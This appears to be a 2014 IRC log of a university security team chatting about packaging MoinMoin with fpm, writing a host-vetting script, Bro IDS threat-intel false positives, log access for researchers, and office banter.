2014-05-16 11:41:37	jazoff	(trying to deterministicly reproduce bro issues that take a day or two to come up)
2014-05-16 11:42:04	hypnotoad	ahhh what are the bro issues? and is there a switch to tell bro to read the same pcap 10 times in arow?
2014-05-16 11:42:21	jazoff	yeah, i think you can just do -r f.pcap -r f.pcap -r f.pcap
2014-05-16 11:42:31	jazoff	random memory issues mostly
2014-05-16 11:44:39	hypnotoad	cool on the -r f.pcap thing. not so much on memory issues. are we seeing them in production?
2014-05-16 11:55:20	wraquel	hypnotoad: so we have 3 options. 1. purchase licenses short term until we get all systems migrated. 2. Licenses per host long term, or 3. Straight migration to CentOS
2014-05-16 12:01:11	jazoff	hypnotoad: no, but the dev version has teh issue
2014-05-16 12:02:52	hypnotoad	wraquel: im just a bit upset we were told months and now its not even 2. that's gonna be a bitch to get ready. i'll be lucky to have the stuff im working on now done by then at this rate...
2014-05-16 12:58:58	hypnotoad	jazoff: some quick package building help?
2014-05-16 13:01:09	jazoff	sure
2014-05-16 13:02:43	hypnotoad	so trying to build moin (the up to date makefile is in the packages repo)
2014-05-16 13:03:04	hypnotoad	and i get this error: No parameters given. You need to pass additional command arguments so that I know what you want to build packages from. For example, for '-s dir' you would pass a list of files and directories. For '-s gem' you would pass a one or more gems to package from. As a full example, this will make an rpm of the 'json' rubygem: `fpm -s gem -t rpm json` {:level=>:warn}
2014-05-16 13:03:04	hypnotoad	Fix the above problems, and you'll be rolling packages in no time! {:level=>:fatal}
2014-05-16 13:03:29	hypnotoad	but i have -s python in there (and have tried -s dir as well..)
2014-05-16 13:10:12	jazoff	one sec
2014-05-16 13:10:43	jazoff	i don't think you want -s python since it's not really a python package
2014-05-16 13:11:29	hypnotoad	well when you untar it, you install with the setup.py
2014-05-16 13:12:25	jazoff	right.. but it goes to /opt?
2014-05-16 13:12:54	hypnotoad	what goes to opt?
2014-05-16 13:13:16	jazoff	ooh yeah then you are missing a lot of stuff
2014-05-16 13:13:30	jazoff	you're telling it to install opt/moin-$(ver)
2014-05-16 13:14:23	hypnotoad	oh right i need to install by hand and see what it creates?
2014-05-16 13:14:49	jazoff	yes
2014-05-16 13:14:55	jazoff	see my makefile for pyev
2014-05-16 13:14:58	jazoff	that's an actual python package
2014-05-16 13:15:07	jazoff	that might work for moinmoin
2014-05-16 13:16:11	hypnotoad	[root@vagrant-centos65 moin-1.9.7]# find / -iname moin
2014-05-16 13:16:11	hypnotoad	/usr/share/moin
2014-05-16 13:16:11	hypnotoad	/usr/share/moin/server/moin
2014-05-16 13:16:11	hypnotoad	/usr/bin/moin
2014-05-16 13:16:11	hypnotoad	/opt/moin-1.9.7/wiki/server/moin
2014-05-16 13:16:11	hypnotoad	/opt/moin-1.9.7/build/scripts-2.6/moin
2014-05-16 13:20:48	hypnotoad	so wouldn't opt/moin-$(ver) be right then?
2014-05-16 13:21:26	jazoff	no..
2014-05-16 13:21:31	jazoff	it would need to be /opt
2014-05-16 13:21:51	hypnotoad	oh just opt ok
2014-05-16 13:22:57	jazoff	but that would miss the usr stuff
2014-05-16 13:22:59	hypnotoad	so i tried changing that to just opt and to using dir instead of python but the exact same thing happens.
2014-05-16 13:23:12	hypnotoad	so i need to do multiple dir declarations?
2014-05-16 13:23:29	jazoff	yes
2014-05-16 13:23:42	jazoff	it really should be made to install into a tempdir and then just specify that
2014-05-16 13:23:52	jazoff	did you say there was a spec file for an older version?
2014-05-16 13:23:56	jazoff	how did that do it?
2014-05-16 13:24:36	hypnotoad	i didnt see a spec file. there was just a prebuilt binary for centos5
2014-05-16 13:24:43	hypnotoad	didnt see what they built that off of though
2014-05-16 13:25:35	jazoff	did it intsall into /opt or did you do that?
2014-05-16 13:25:45	hypnotoad	it installed to opt
2014-05-16 13:25:59	hypnotoad	im trying to see if setup.py allows for a dir to point to so i can do the tmpdir
2014-05-16 13:26:33	hypnotoad	doesnt look like it
2014-05-16 13:28:11	hypnotoad	damn...i forgot a \ which is why it was failing
2014-05-16 13:28:20	hypnotoad	added that before the opt line and now it gets further
2014-05-16 13:28:27	jazoff	oh lol
2014-05-16 13:28:35	jazoff	i was going to say you could be missing a \
2014-05-16 13:28:39	jazoff	but I didn't see one missing
2014-05-16 13:28:41	jazoff	did you not push?
2014-05-16 13:29:14	hypnotoad	not yet...figured get it working here first then push
2014-05-16 13:29:41	jazoff	https://wiki.debian.org/Python/Packaging
2014-05-16 13:29:42	jazoff	says
2014-05-16 13:29:50	jazoff	--root is distutils DESTDIR
2014-05-16 13:29:58	jazoff	so, you just need --root sometempdir
2014-05-16 13:30:23	hypnotoad	ahhh ok ill give that a shot since this is now failing on that part basically
2014-05-16 13:32:22	hypnotoad	error: option --root not recognized
2014-05-16 13:32:22	hypnotoad	maybe not
2014-05-16 13:34:01	hypnotoad	fpm -s dir -t rpm -n "moin" \
2014-05-16 13:34:01	hypnotoad	        -v 1.9.7 \
2014-05-16 13:34:01	hypnotoad	        --iteration 1 \
2014-05-16 13:34:01	hypnotoad	        --config-files wikiconfig.py \
2014-05-16 13:34:01	hypnotoad	        --config-files wikiserverconfig.py \
2014-05-16 13:34:01	hypnotoad	        --config-files wikiserverlogging.conf \
2014-05-16 13:34:01	hypnotoad	        -p moin-VERSION_ARCH.rpm \
2014-05-16 13:34:01	hypnotoad	Invalid package configuration: Cannot package the path ' ', does it exist? {:level=>:error}
2014-05-16 13:34:10	hypnotoad	seems to not be picking up the dirs at the end
2014-05-16 13:35:22	hypnotoad	i pushed the newest one if you see anything obvious..
2014-05-16 13:40:09	jazoff	sure? i don't see --root
2014-05-16 13:40:29	hypnotoad	ya that didnt work
2014-05-16 13:40:35	hypnotoad	"rror: option --root not recognized"
2014-05-16 13:40:38	jazoff	but I don't know where you added it :)
2014-05-16 13:40:46	hypnotoad	fair point..one sec
2014-05-16 13:42:04	hypnotoad	ok
2014-05-16 13:44:04	jazoff	--root needs to go after install
2014-05-16 13:45:47	hypnotoad	fpm -s dir -t rpm -n "moin" \
2014-05-16 13:45:47	hypnotoad	        -v 1.9.7 \
2014-05-16 13:45:47	hypnotoad	        --iteration 1 \
2014-05-16 13:45:47	hypnotoad	        -C /tmp/installdir
2014-05-16 13:45:47	hypnotoad	No parameters given. You need to pass additional command arguments so that I know what you want to build packages from. For example, for '-s dir' you would pass a list of files and directories. For '-s gem' you would pass a one or more gems to package from. As a full example, this will make an rpm of the 'json' rubygem: `fpm -s gem -t rpm json` {:level=>:warn}
2014-05-16 13:49:35	jazoff	sounds like you are missing a \ again
2014-05-16 13:49:38	jazoff	like after installdir
2014-05-16 13:50:43	 *	hypnotoad sigh
2014-05-16 13:51:16	hypnotoad	Invalid package configuration: Cannot package the path ' ', does it exist? {:level=>:error}
2014-05-16 13:53:19	jazoff	what do you have now?
2014-05-16 13:55:34	hypnotoad	just pushed. i noticed something strange though. the color of the \ in vim are all purple except the one after         -p moin-VERSION_ARCH.rpm \ which shows up as red (same color as all the text)
2014-05-16 13:55:42	hypnotoad	makes me think theres a syntax error somewhere but i cant see it
2014-05-16 14:01:25	jazoff	you have a trailing space
2014-05-16 14:04:51	hypnotoad	ok sweet now im finally back to the actual fpm error i ahd before..
2014-05-16 14:04:54	hypnotoad	/usr/lib/ruby/gems/1.8/gems/fpm-1.1.0/lib/fpm/package/rpm.rb:359:in `output': Config file path /tmp/package-dir-staging20140516-2247-129r3za/wikiconfig.py does not exist (RuntimeError)
2014-05-16 14:05:07	hypnotoad	its like fpm is failing to make a file...not sure how i can fix that
2014-05-16 14:07:29	jazoff	no, it's probably because you told it
2014-05-16 14:07:34	jazoff	er
2014-05-16 14:07:36	jazoff	stupid irssi
2014-05-16 14:07:43	jazoff	--config-files wikiconfig.py
2014-05-16 14:07:49	jazoff	and it does not exist
2014-05-16 14:08:01	jazoff	you probably mean etc/wikiconfig.py or something
2014-05-16 14:09:38	hypnotoad	ah ok ya its actually here...whoops
2014-05-16 14:09:38	hypnotoad	/tmp/installdir/usr/share/moin/config/
2014-05-16 14:12:47	hypnotoad	woooo nothing like package building to make me feel stupid...finally working now thanks for the help
2014-05-16 14:13:37	jazoff	:)
2014-05-16 14:13:57	jazoff	yeah, how homebrew works is actually pretty nice
2014-05-16 14:14:07	jazoff	gnu stow worked the same way years and years ago but no one used it
2014-05-16 14:14:21	jazoff	there are people working on linuxbrew though :)
2014-05-16 14:17:26	wraquel	fyi, Col. Hopkins is speaking in room 1122 at 3
2014-05-16 14:17:39	wraquel	The UI grad that went into space
2014-05-16 14:18:57	hypnotoad	yup the AF guy..maggies pumped about that.
2014-05-16 14:38:27	hypnotoad	ok moin package in the repo
2014-05-16 14:57:36	hypnotoad	im gonna make the drive now. if anyone needs anything leave a note in here. ill be back once i get to chicago.
2014-05-16 14:57:50	jazoff	chicago?
2014-05-16 15:38:23	wraquel	It's a small insignificant town to the north of us.
2014-05-16 15:49:25	jazoff	:-P
2014-05-16 18:26:59	hypnotoad	thats where the fam is from. got a thing this weekend. and the last 4. and the next 8. sighhh
2014-05-16 20:17:43	wraquel	Big family
2014-05-19 09:50:09	-->	soehlert (soehlert@hidden-EF13FB3B.hsd1.il.comcast.net) has joined #security
2014-05-19 09:50:09	--	Channel #security: 5 nicks (0 ops, 0 halfops, 0 voices, 5 normals)
2014-05-19 09:50:11	--	Mode #security [+]
2014-05-19 09:50:11	--	Channel created on Tue, 04 Feb 2014 20:39:53
2014-05-19 09:56:57	wraquel	Ravi's group would like to test out their intrusion detection research that they've been working on with the logs we've been giving them. They'd like to do this through looking at Bro notices and logins from syslog.
2014-05-19 09:58:38	wraquel	Thoughts on the best way to get Phuong access to those logs real time?
2014-05-19 09:59:48	soehlert	i talked to adam about this. he wants us to set up and run a vm (booo) that has a syslog receiver, and then we'll scp the bro logs over. not sure how to deal with access for phuong. OTP is out..
2014-05-19 09:59:52	wraquel	Mind you, I've already told them that with the increased monitoring, BHR, etc that the premise of their work may not apply to our current state.
2014-05-19 10:00:11	wraquel	Could do duo.
2014-05-19 10:00:32	wraquel	Since it's a small group we can easily set up a 10 person site for this.
2014-05-19 10:01:27	wraquel	I already have a small 10 person Duo instance being unutilized.
2014-05-19 10:01:53	soehlert	i wouldnt mind duo. not sure the OTP issue was on our side but on theres though..
2014-05-19 10:09:54	wraquel	Also, we can easily get another instance from campus set up.
2014-05-19 10:12:44	jazoff	are they going to be copying the logs from us?
2014-05-19 10:12:54	jazoff	could we just push the logs to them?
2014-05-19 10:12:59	jazoff	bro does have the sftp writer...
2014-05-19 10:13:29	jazoff	or could just run another instance of the log archival rsync program
2014-05-19 10:13:41	wraquel	true.
2014-05-19 10:13:55	soehlert	jazoff: thats what i was envisioning basically, scp via the log archival program.
2014-05-19 10:14:14	soehlert	and ya we're definitely pushing. no pulling from them..
2014-05-19 10:16:57	jazoff	ah, so OTP would not come in to play then right?
2014-05-19 10:19:50	soehlert	well for the vm he has to log into that adam wants me to run
2014-05-19 10:20:40	jazoff	oh, i'm confused then :)
2014-05-19 10:22:15	soehlert	we run a vm that gets syslogs and bro logs pushed to it. he gets on that machine to try out his research stuff.
2014-05-19 10:27:30	jazoff	ah, I thought we would push to their machine
2014-05-19 10:27:44	soehlert	well yes. except as of now, we are running their machine
2014-05-19 10:57:06	soehlert	jazoff: i used sshuttle the other day. man was it easy to get going
2014-05-19 11:02:33	jazoff	cool :)
2014-05-19 11:02:40	jazoff	i think it doesn't do UDP but otherwise is nice
2014-05-19 11:12:48	jazoff	speaking of chicago, http://arstechnica.com/gaming/2014/05/inside-the-largest-video-game-arcade-in-the-usa/
2014-05-19 11:13:20	wraquel	How did I not know this existed...
2014-05-19 11:18:09	soehlert	jazoff: it did dns..
2014-05-19 11:18:31	soehlert	and ya arcades are becoming a big thing there. especially arcade bars.
2014-05-19 11:20:17	jazoff	i think it does something special for DNS
2014-05-19 11:20:21	jazoff	at least, I couldn't run mosh over it
2014-05-19 11:20:35	soehlert	ahh i didnt pay attention i just saw the option to have it do dns and assumed
2014-05-19 11:26:31	wraquel	http://hqbeercade.com/
2014-05-19 11:26:39	soehlert	yup thats my favorite one
2014-05-19 11:26:42	wraquel	Free video games. Just buy beer
2014-05-19 11:27:00	soehlert	the amount of games there is just staggering too
2014-05-19 11:56:16	keist	anyone up for volleyball on Thursday around 4 again?
2014-05-19 11:56:29	soehlert	i can probably do that
2014-05-19 11:57:37	keist	wraquel: eyrich 
2014-05-19 12:01:09	wraquel	$30 for all you can eat?hmmm
2014-05-19 12:01:22	wraquel	Guess I had that queued up ealier...
2014-05-19 12:01:26	wraquel	Anywho.
2014-05-19 12:01:32	wraquel	Yeah, Thursday sounds ok
2014-05-19 12:02:02	soehlert	all you can eat and 3 tall boy daisy cutters. yum.
2014-05-19 12:02:57	wraquel	Sounds like a road trip to me
2014-05-19 12:03:21	soehlert	hah i'll be there this weekend at some point probably..
2014-05-19 17:04:42	keist	here's a wiki page to add machines that have been tested with CentOS: https://wiki.ncsa.illinois.edu/display/CSD/CentOS+Puppet+Testing
2014-05-20 10:12:34	jazoff	quite day so far :)
2014-05-20 10:12:38	soehlert	?
2014-05-20 10:12:44	soehlert	quite a day or quiet day?
2014-05-20 10:12:48	jazoff	quiet too :)
2014-05-20 10:12:51	jazoff	quite quiet
2014-05-20 10:12:57	soehlert	ahh ha indeed
2014-05-20 10:13:51	wraquel	Need a security tip to put in Bytes and Pieces. Any suggestions?
2014-05-20 10:14:45	jazoff	don't believe everything you read online? :)
2014-05-20 10:22:44	jazoff	walk time before it gets too hot :)
2014-05-20 10:46:33	soehlert	eyrich: not even givin me 5 minutes to deal with the CA backups huh? :)
2014-05-20 10:48:44	jazoff	erm
2014-05-20 10:48:49	jazoff	/bro/etc/tables/domain_malware.cif:www.google.com
2014-05-20 10:48:58	jazoff	er
2014-05-20 10:48:58	soehlert	that seems incorrect
2014-05-20 10:48:58	jazoff	/bro/etc/tables/domain_malware.cif:www.google.com       Intel::DOMAIN   CIF - public    possible c2     http://www.nothink.org/blacklist/blacklist_malware_http.txt (public)        -       high    75
2014-05-20 10:49:02	jazoff	yeahhhh
2014-05-20 10:50:36	jazoff	/bro/etc/tables/domain_malware.cif:gmail.com    Intel::DOMAIN   CIF - public    possible c2     http://www.nothink.org/blacklist/blacklist_malware_dns.txt (
2014-05-20 10:52:19	jazoff	1400598534.141258       CMiIUeuNQrOeQ7Qh4       141.142.2.2     59350   192.31.80.30    53      -       -       -       tibiakeylogger.com      Intel::DOMAIN       DNS::IN_REQUEST CIF - need-to-know,malhosts
2014-05-20 10:52:29	jazoff	now that seems bad.. though from dns server makes it useless
2014-05-20 10:53:37	jazoff	and no one has connected to the ip that resolves too. odd
2014-05-20 10:53:51	soehlert	ya thats strange..
2014-05-20 11:01:45	wraquel	It's at 75%.
2014-05-20 11:02:38	wraquel	I usually don't look at records under 85%
2014-05-20 12:34:57	soehlert	jazoff: making progress on the vetting script..
2014-05-20 12:35:42	jazoff	:)
2014-05-20 12:35:46	jazoff	the .sh or the .py ?
2014-05-20 12:35:58	soehlert	the sh part so it actually puts out something for the py script to see
2014-05-20 12:36:04	jazoff	:)
2014-05-20 12:46:30	jazoff	do all of the systems vetting is done on have python? or is that not a sure thing?
2014-05-20 12:46:41	soehlert	no guarantee
2014-05-20 12:47:26	soehlert	i know rhel/centos includes python. but does ubuntu/debian? suse? *bsd?
2014-05-20 12:47:48	jazoff	linux generally, not sure about bsd
2014-05-20 12:47:51	wraquel	debian/variants, yes.
2014-05-20 12:48:00	wraquel	Not sure about suse, assuming. BSD, dunno.
2014-05-20 12:48:53	soehlert	well we can take this all to python if you think it makes sense. bash made sense because 1) i ddint know any python 2) wouldnt we just be making system calls in python?
2014-05-20 12:49:09	jazoff	mostly yeah, but it would make the data interchange easy
2014-05-20 12:49:27	jazoff	though maybe just finding a json encoder bash function would work too
2014-05-20 12:49:52	soehlert	well we can go that way if you want. im basically having to rewrite the entirety of printing section as it is
2014-05-20 12:50:49	jazoff	would be nice if you could just have a hash in bash and dump it as json
2014-05-20 12:51:00	jazoff	not finding anything on google though for bash json encoders
2014-05-20 12:55:07	soehlert	ya everything i see is just saying pipe it through python..
2014-05-20 12:55:41	soehlert	hmmm...http://stedolan.github.io/jq/
2014-05-20 12:57:00	jazoff	ah, I use that all the time
2014-05-20 12:57:07	jazoff	but I don't think it would help with the vetting :)
2014-05-20 12:57:34	soehlert	will it actually work. the link to it said it would, but looking at the tutorial it looks like it requires json input
2014-05-20 12:57:39	soehlert	oh ok nvm ya..
2014-05-20 12:58:44	soehlert	well i'll give this a shot in python. then you can take my enevitably shitty code and help me make it better. if it'll work on linux by default that covers almost everything we'll see
2014-05-20 12:58:57	soehlert	plus the bash as it is im not sure will work on *bsd anyways
2014-05-20 12:59:36	jazoff	so in python what I would do is just make one function per data source
2014-05-20 12:59:49	jazoff	then you just need to add all the functions to an array and do something like
2014-05-20 12:59:52	jazoff	output = {}
2014-05-20 13:00:23	jazoff	for func in funcs: output[func.__name__] = func()
2014-05-20 13:01:58	soehlert	data source meaning? 
2014-05-20 13:02:16	jazoff	iptables, suids, etc
2014-05-20 13:03:04	soehlert	ok thats what i figured
2014-05-20 13:07:56	eyrich	soehlert: when you have a chance can you help me review the xdmod system to see why qualys cant get in
2014-05-20 16:29:30	jazoff	does neteng run a looking glass page/router ?
2014-05-21 08:40:48	eyrich	we are now doing state syncing between pfsense cluster nodes hosted on ESX
2014-05-21 08:41:22	jazoff	yay? :)
2014-05-21 08:41:23	eyrich	Net.ReversePathFwdCheckPromisc has to be set to 1 on each vm host
2014-05-21 08:42:10	eyrich	failover caused streams to fail and needed to be restarted
2014-05-21 08:44:55	eyrich	without that option multicast packets were causing carp on both hosts to go into backup state
2014-05-21 08:45:41	eyrich	because the nic teaming was re-sending the packet up the other links, and in promisicous mode the vswitch was forwarding to the host and confusing it
2014-05-21 08:45:59	eyrich	by default esx blocks that traffic when not in promisc mode
2014-05-21 08:46:35	eyrich	it will be nice when vmware adds lacp to standard vswitches - since hyperv has it for free now I expect it to happen
2014-05-21 08:50:33	jazoff	from what I see hyperv networking is MUCH better than vmware
2014-05-21 08:50:39	jazoff	but not sure what vmware is going to do with NSX
2014-05-21 08:54:00	eyrich	yes and no - I find it easier to get a handle on esx's config and managment. HyperV offers more features that I want - namly LACP nic teaming, which comes from the OS. but I think the vlan managment is clunky
2014-05-21 08:54:17	eyrich	off to the bw change control meeting
2014-05-21 09:56:53	soehlert	jazoff: for this vetting script, do you see it sending directly to the portal page, or do i need to work out the same sort of process as before to get it to monsoon first?
2014-05-21 09:59:26	jazoff	issue with sending directly to portal is firewall
2014-05-21 10:00:45	soehlert	are we ok with opening it to all of 141.142? or is that going to leave us insecure?
2014-05-21 10:01:36	jazoff	it's on the private network now...
2014-05-21 10:01:54	jazoff	didn't we want it behind the TFA proxy(fog?)
2014-05-21 10:02:02	soehlert	we did as far as logging in
2014-05-21 10:02:19	soehlert	and we had no need for it on the public ip space. its also perfectly acceptible to keep it that way
2014-05-21 10:02:44	soehlert	just wondering the scope of this script. im sure its doable just didnt wanna do it and then realize its more work than needed
2014-05-21 10:03:44	jazoff	what about....
2014-05-21 10:04:01	jazoff	is it too hard to scp something OFF one of the hosts being vetted (due to weird login paths?)
2014-05-21 10:04:12	jazoff	cause then one could just pull down the txt file and upload it 
2014-05-21 10:05:18	soehlert	ya for some reason, some people here think removing the scp binary is "good security"
2014-05-21 10:05:36	soehlert	hence my weird thing i had to do with downloading the ftp binary and then using that
2014-05-21 10:28:13	eyrich	so the big 2 servers being blocked for sending udp are carbon/steel - I have emailed LaPine
2014-05-21 10:28:34	soehlert	That's the best way to handle it. That's how we've been doing it up till now
2014-05-21 10:36:00	eyrich	once those are fixed I will check again.
2014-05-21 11:33:53	soehlert	well that was unexpected. user removal ticket and they input the wrong login
2014-05-21 11:48:38	soehlert	jazoff: possibly poorly structured, probably inefficient, and definitely need some help on what i have now, but first part of vetting.py is in puppet
2014-05-21 12:03:20	soehlert	cricket all around...what time are we meeting?
2014-05-21 13:05:22	jazoff	was talking to daniel about broctl
2014-05-22 08:45:49	jazoff	holy nagios emails
2014-05-22 08:50:33	jazoff	early walk time.. supposed to get HOT today
2014-05-22 09:03:26	eyrich	jazoff: look for Auth API integration on Duo
2014-05-22 09:06:56	jazoff	we have auth api.. we don't have admin api
2014-05-22 09:07:44	eyrich	ah
2014-05-22 09:07:52	eyrich	i will email
2014-05-22 09:49:05	--	irc: disconnected from server
2014-05-22 09:49:15	-->	soehlert (soehlert@hidden-EF13FB3B.hsd1.il.comcast.net) has joined #security
2014-05-22 09:49:15	--	Channel #security: 5 nicks (0 ops, 0 halfops, 0 voices, 5 normals)
2014-05-22 09:49:27	--	Mode #security [+]
2014-05-22 09:49:27	--	Channel created on Tue, 04 Feb 2014 20:39:53
2014-05-22 09:54:31	jazoff	soehlert: there you are...
2014-05-22 09:54:40	jazoff	soehlert: are you working on the vetting.py still?
2014-05-22 10:04:00	jazoff	i can add some features but I don't want to cause merge issues
2014-05-22 10:07:44	soehlert	im not currently working. feel free to push
2014-05-22 10:12:49	wraquel	sigh... may be time to replace irssi. It's having weird scree rewrite issues when I move between windows.
2014-05-22 10:13:02	soehlert	come to the weechat side.
2014-05-22 10:17:34	wraquel	leaning that way....
2014-05-22 10:22:35	wraquel	ebay dump http://pastebin.com/vmvjGw3N
2014-05-22 10:23:57	eyrich	jazoff: do you have the meeting with arista on your calendar
2014-05-22 10:25:23	eyrich	thats $758
2014-05-22 10:30:41	jazoff	yes
2014-05-22 10:30:55	jazoff	1pm right?
2014-05-22 10:30:59	jazoff	noon for you
2014-05-22 10:31:02	eyrich	yes
2014-05-22 10:46:27	eyrich	lunch time - early because noon meeting
2014-05-22 10:47:09	jazoff	soehlert: pushed
2014-05-22 10:47:26	soehlert	cool will take a peek when i finish what im working on.
2014-05-22 10:47:39	soehlert	in the meantime. how did my code look? 
2014-05-22 10:47:45	jazoff	not bad
2014-05-22 10:47:59	jazoff	changed how things were structured a bit and fixed some likely OS X only issues
2014-05-22 10:48:06	soehlert	OSX only issues?
2014-05-22 10:48:18	jazoff	/etc/passwd starts with comments
2014-05-22 10:48:25	jazoff	##
2014-05-22 10:48:26	jazoff	# User Database
2014-05-22 10:48:26	jazoff	#
2014-05-22 10:48:44	soehlert	weird. my testing was all done on rhel
2014-05-22 10:55:02	jazoff	so mostly I just made it return things a little different
2014-05-22 10:55:05	jazoff	then add some attributes
2014-05-22 10:55:16	soehlert	ya returns are still very iffy for me. 
2014-05-22 10:55:28	jazoff	then it can just generate the vetting.json from all the return values of the functions
2014-05-22 10:55:56	jazoff	doh, just realized I don't need the .names
2014-05-22 10:55:56	soehlert	also i havent done json stuff before so i was just printing for testing. knew id need help overhauling that
2014-05-22 10:56:01	jazoff	I wanted it different from __name__
2014-05-22 10:56:21	jazoff	but I can just do .__name__.replace("get_", "").replace("_", " ") and get the same names I manually used
2014-05-22 10:59:44	jazoff	ah, I should eat now too
2014-05-22 11:15:35	soehlert	jazoff: after your meeting with arista I'd like to talk through the changes you made just for my learning purposes.
2014-05-22 11:20:47	jazoff	ok
2014-05-22 16:01:42	jazoff	is tomorrow one of them floating hollidays?
2014-05-22 16:01:48	jazoff	or should I just take theday off anyway since everyone else is?
2014-05-22 16:04:01	wraquel	soooo, we have 1182 unique hosts in syslog.
2014-05-22 16:05:38	jazoff	yay? boo?
2014-05-22 16:05:54	wraquel	Higher than I thought.
2014-05-23 02:41:56	--	irc: disconnected from server
2014-05-23 02:42:07	-->	soehlert (soehlert@hidden-EF13FB3B.hsd1.il.comcast.net) has joined #security
2014-05-23 02:42:07	--	Channel #security: 5 nicks (0 ops, 0 halfops, 0 voices, 5 normals)
2014-05-23 02:42:19	--	Mode #security [+]
2014-05-23 02:42:19	--	Channel created on Tue, 04 Feb 2014 20:39:53
2014-05-23 10:00:15	soehlert	jazoff: did you decide to take today off?
2014-05-23 10:21:15	jazoff	not yet
2014-05-23 10:21:39	jazoff	I built this yesterday: http://5d89c584.ngrok.com/
2014-05-23 10:22:15	soehlert	not yet? hahah just gonna make it a short one
2014-05-23 10:22:27	jazoff	doesn't seem like much is going on
2014-05-23 10:22:30	jazoff	bro call calceled
2014-05-23 10:22:37	wraquel	http://i.imgur.com/1RHNO.jpg
2014-05-23 10:22:46	jazoff	:)
2014-05-23 10:22:59	soehlert	well im on something now but this afternoon could be good fun with python and vetting
2014-05-23 10:22:59	soehlert	also i thought your project was that bro code for a second...
2014-05-23 10:23:22	jazoff	hah
2014-05-23 11:06:40	soehlert	jazoff: i feel like im being overly redundant setting up the output files but i cant think of how to make it work
2014-05-23 11:12:38	jazoff	yes...
2014-05-23 11:12:45	jazoff	        OUTPUT_INFO=$HOME_DIR/$HOST-$DATE/info.txt
2014-05-23 11:12:53	jazoff	        OUTPUT_INFO=$HOME_DIR/$HOST-$DATE/info.txt
2014-05-23 11:12:58	jazoff	notice how those lines are the same :)
2014-05-23 11:13:07	jazoff	you're only changing HOME_DIR
2014-05-23 11:13:11	jazoff	the rest can be outside of the if block
2014-05-23 11:14:27	soehlert	duh. i was thinking it wouldnt set them properly, but it will
2014-05-23 11:15:09	soehlert	i can even do the mkdir and net_rc stuff outside too can't i?
2014-05-23 11:15:25	jazoff	yes
2014-05-23 11:54:28	jazoff	so http://apps.splunk.com/app/1617/ is a thing
2014-05-23 11:55:03	wraquel	huh... who wrote it?
2014-05-23 11:55:08	soehlert	how do you see this being used?
2014-05-23 11:55:13	jazoff	splunk
2014-05-23 11:55:22	jazoff	it does the input stuff better than the way I do it
2014-05-23 11:55:26	soehlert	i mean whats differnt between sending the logs like we do now
2014-05-23 11:55:26	soehlert	well obviously splunk..
2014-05-23 11:55:39	jazoff	much less fragile
2014-05-23 11:55:40	wraquel	Does 2.1 and 22
2014-05-23 11:55:56	jazoff	yeah, and it will do 2.3 as well, nothign really changed in the logs files in 2.3
2014-05-23 11:56:35	jazoff	apparently the thing I could never figure out was 
2014-05-23 11:56:35	soehlert	ahh less fragile is good
2014-05-23 11:56:35	jazoff	FIELD_HEADER_REGEX = ^#fields\t(.*)
2014-05-23 12:00:46	jazoff	definitely would be worthwhile to get that going, but might be best to wait for the new splunk boxes
2014-05-23 12:01:43	jazoff	oh actually, it goes almost entirely on the forwarder so that wouldn't help
2014-05-23 12:03:17	jazoff	might as well get it going now
2014-05-23 12:09:55	jazoff	oh, it needs splunk 6
2014-05-23 12:09:57	jazoff	so wait it is :)
2014-05-23 12:12:43	jazoff	one thing that could simplify the vetting script is to make an output function
2014-05-23 12:12:44	jazoff	like
2014-05-23 12:12:56	jazoff	output_file that basically does echo $2 > $1
2014-05-23 12:12:59	jazoff	so you could do
2014-05-23 12:13:33	jazoff	output_file "nfs_mounts.txt" $NFS_MOUNTS
2014-05-23 12:13:44	jazoff	or i thin better
2014-05-23 12:13:46	jazoff	output_file "nfs_mounts.txt" "$NFS_MOUNTS"
2014-05-23 12:14:01	jazoff	then you wouldn't need those variables at all
2014-05-23 12:14:38	soehlert	ya thats probably a good idea
2014-05-23 12:15:01	soehlert	i always forget you can create functions in bash...first i gotta actually make the commands work though
2014-05-23 12:15:01	soehlert	i dont get why they stopped working all of a sudden
2014-05-23 12:16:15	jazoff	try running the script with sh -x
2014-05-23 12:53:14	soehlert	jazoff: can you see any reason this is happening?
2014-05-23 12:53:21	soehlert	mkdir -p /home/soehlert/-
2014-05-23 12:53:21	soehlert	notice the trailing -
2014-05-23 12:56:36	jazoff	mkdir -p $HOME_DIR/$HOST-$DATE
2014-05-23 12:56:52	jazoff	you have neither HOST or DATE defined
2014-05-23 12:56:52	soehlert	oh crap so host and date arent set yet..
2014-05-23 12:57:18	soehlert	i was thinking soehlert was right...sigh
2014-05-23 12:57:29	soehlert	as in soehlert = $HOST-$DATE for some reason
2014-05-23 12:58:34	jazoff	sh -x should have helped with that 
2014-05-23 13:01:34	jazoff	http://rwmj.wordpress.com/2014/05/22/using-lvms-new-cache-feature/
2014-05-23 13:01:47	soehlert	it did. brain just wasnt working
2014-05-23 13:22:36	soehlert	jazoff: think i got it. the only thing im not positive i like is the output format of the sec_access stuff
2014-05-23 13:23:10	soehlert	also you think the printing function is still needed? i did away with the whole printing section and variables
2014-05-23 13:35:37	jazoff	hmm
2014-05-23 13:36:28	jazoff	that looks OK i guess
2014-05-23 13:36:52	jazoff	just split that sec access thing up to multiple lines
2014-05-23 13:36:57	jazoff	for u in .... ;do 
2014-05-23 13:37:02	jazoff	 echo ...
2014-05-23 13:37:12	jazoff	done >> ...
2014-05-23 13:38:16	soehlert	ha right forgot one liner not needed anymore
2014-05-23 13:38:27	soehlert	do you think the way it outputs is good though?
2014-05-23 13:40:03	jazoff	i think those file variables may not really be needed
2014-05-23 13:40:18	jazoff	hmm
2014-05-23 13:40:19	jazoff	iptables -n -L >> $OUTPUT_IPTABLES
2014-05-23 13:40:19	jazoff	vs.
2014-05-23 13:40:33	jazoff	iptables -n -L >> $O/iptables.txt
2014-05-23 13:41:01	soehlert	ya the only reason i didnt do that is because of the chown thing
2014-05-23 13:41:01	soehlert	i have to do that or in some places it ends up with the wrong owner
2014-05-23 13:41:36	soehlert	but i wonder if i can find a happy medium
2014-05-23 13:42:58	jazoff	wrong order?
2014-05-23 13:43:16	soehlert	wrong owner
2014-05-23 13:43:59	soehlert	as in i somehow end up not owning the files so i cant do things with them
2014-05-23 13:44:19	jazoff	those should be the same
2014-05-23 13:44:40	soehlert	what should be the same?
2014-05-23 13:45:40	jazoff	$OUTPUT_IPTABLES vs $O/iptables.txt
2014-05-23 13:46:22	soehlert	right so i'll have to still loop over them and chown them. just thought itd be easier with the variables. but maybe not, i suppose i can just chown -R the dir 
2014-05-23 13:46:47	jazoff	oh, i see what you mean now
2014-05-23 13:46:52	jazoff	yeah, easier just to chown at the end
